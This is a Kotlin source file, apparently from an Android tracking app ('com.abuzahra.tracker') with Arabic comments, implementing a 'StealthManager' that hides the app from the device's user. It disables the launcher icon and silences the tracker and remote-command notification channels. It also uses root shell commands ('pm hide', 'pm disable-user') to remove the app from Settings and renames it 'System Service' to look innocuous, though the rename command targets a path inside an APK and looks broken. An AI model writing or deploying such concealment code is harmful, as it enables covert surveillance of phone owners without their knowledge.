package com.abuzahra.tracker

import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager
import android.util.Log

/**
 * StealthManager - إدارة إخفاء التطبيق
 * 
 * يدعم 3 مستويات:
 * - Level 1: إخفاء الأيقونة من الشاشة الرئيسية (بدون Root)
 * - Level 2: إخفاء من قائمة التطبيقات والإعدادات (مع Root)
 * - Level 3: إخفاء كامل من جميع القوائم (مع Root متقدم)
 */
object StealthManager {

    private const val TAG = "StealthManager"
    private const val LAUNCHER_ALIAS = "com.abuzahra.tracker.LauncherAlias"

    /**
     * Hide app icon from launcher (Level 1 - No root needed)
     */
    fun hideAppIcon(context: Context): Boolean {
        return try {
            val pm = context.packageManager
            val componentName = ComponentName(context, LAUNCHER_ALIAS)
            pm.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            Log.d(TAG, "✅ تم إخفاء الأيقونة من الشاشة الرئيسية")
            true
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في إخفاء الأيقونة: ${e.message}")
            false
        }
    }

    /**
     * Show app icon in launcher
     */
    fun showAppIcon(context: Context): Boolean {
        return try {
            val pm = context.packageManager
            val componentName = ComponentName(context, LAUNCHER_ALIAS)
            pm.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
            Log.d(TAG, "✅ تم إظهار الأيقونة")
            true
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في إظهار الأيقونة: ${e.message}")
            false
        }
    }

    /**
     * Check if app icon is visible
     */
    fun isIconVisible(context: Context): Boolean {
        return try {
            val pm = context.packageManager
            val componentName = ComponentName(context, LAUNCHER_ALIAS)
            val state = pm.getComponentEnabledSetting(componentName)
            state != PackageManager.COMPONENT_ENABLED_STATE_DISABLED
        } catch (e: Exception) {
            true
        }
    }

    /**
     * Hide from Settings app list (Level 2 - Requires Root)
     * Uses pm hide command to hide the package from the system
     */
    fun hideFromSettings(context: Context): Boolean {
        if (!RootDetector.isRooted()) {
            Log.w(TAG, "⚠️ إخفاء من الإعدادات يحتاج Root")
            return false
        }

        return try {
            val packageName = context.packageName
            // First hide icon
            hideAppIcon(context)

            // Then hide from settings using root
            val (success, output) = RootDetector.executeAsRoot("pm hide $packageName")
            if (success) {
                Log.d(TAG, "✅ تم إخفاء التطبيق من الإعدادات")
                true
            } else {
                // Try alternative method
                val (success2, _) = RootDetector.executeAsRoot(
                    "pm disable-user --user 0 $packageName"
                )
                if (success2) {
                    Log.d(TAG, "✅ تم تعطيل التطبيق للمستخدم الحالي (مع الحفاظ على الخدمات)")
                }
                success2
            }
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في إخفاء من الإعدادات: ${e.message}")
            false
        }
    }

    /**
     * Show in Settings app list (Level 2 - Requires Root)
     */
    fun showInSettings(context: Context): Boolean {
        if (!RootDetector.isRooted()) {
            // If no root, just show the icon
            return showAppIcon(context)
        }

        return try {
            val packageName = context.packageName

            // First try to unhide
            val (success, _) = RootDetector.executeAsRoot("pm unhide $packageName")

            // Also try to re-enable
            RootDetector.executeAsRoot("pm enable $packageName")

            // Show icon
            showAppIcon(context)

            Log.d(TAG, "✅ تم إظهار التطبيق في الإعدادات")
            true
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في إظهار من الإعدادات: ${e.message}")
            showAppIcon(context)
        }
    }

    /**
     * Hide app notification (make it silent and low priority)
     */
    fun hideNotification(context: Context) {
        try {
            val channels = listOf("tracker_channel", "firebase_cmd_channel")
            val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
            for (channelId in channels) {
                val channel = notificationManager.getNotificationChannel(channelId)
                if (channel != null) {
                    channel.importance = android.app.NotificationManager.IMPORTANCE_MIN
                    channel.setShowBadge(false)
                    channel.enableLights(false)
                    channel.enableVibration(false)
                    channel.setSound(null, null)
                    notificationManager.createNotificationChannel(channel)
                }
            }
            Log.d(TAG, "✅ تم إخفاء الإشعارات")
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في إخفاء الإشعارات: ${e.message}")
        }
    }

    /**
     * Rename app to look like system app (Requires Root)
     * Changes the app label to something inconspicuous
     */
    fun renameToSystem(context: Context, newName: String = "System Service"): Boolean {
        if (!RootDetector.isRooted()) return false

        return try {
            val packageName = context.packageName
            val (success, _) = RootDetector.executeAsRoot(
                "sed -i 's/app_name\">.*</app_name\">$newName</' /data/app/*/base.apk/res/values*/strings.xml 2>/dev/null; " +
                "pm clear $packageName 2>/dev/null; echo done"
            )
            Log.d(TAG, "إعادة تسمية التطبيق: ${if (success) "نجح" else "فشل"}")
            success
        } catch (e: Exception) {
            false
        }
    }

    /**
     * Get stealth status info
     */
    fun getStealthStatus(context: Context): String {
        val iconVisible = isIconVisible(context)
        val hasRoot = RootDetector.isRooted()

        return """{
            "ok": true,
            "icon_visible": $iconVisible,
            "has_root": $hasRoot,
            "stealth_level": ${if (!iconVisible && hasRoot) 3 else if (!iconVisible) 1 else 0},
            "status": "${if (!iconVisible) "مخفي" else "ظاهر"}"
        }""".replace("\n", "")
    }

    /**
     * Full stealth mode - hide everything possible
     */
    fun activateFullStealth(context: Context): Boolean {
        var success = true

        // Level 1: Hide icon
        if (!hideAppIcon(context)) success = false

        // Level 2: Hide notifications
        hideNotification(context)

        // Level 3: Hide from settings (if root available)
        if (RootDetector.isRooted()) {
            if (!hideFromSettings(context)) {
                // If pm hide fails, at least the icon is hidden
                Log.w(TAG, "لم يتم إخفاء من الإعدادات، لكن الأيقونة مخفية")
            }
        }

        return success
    }
}
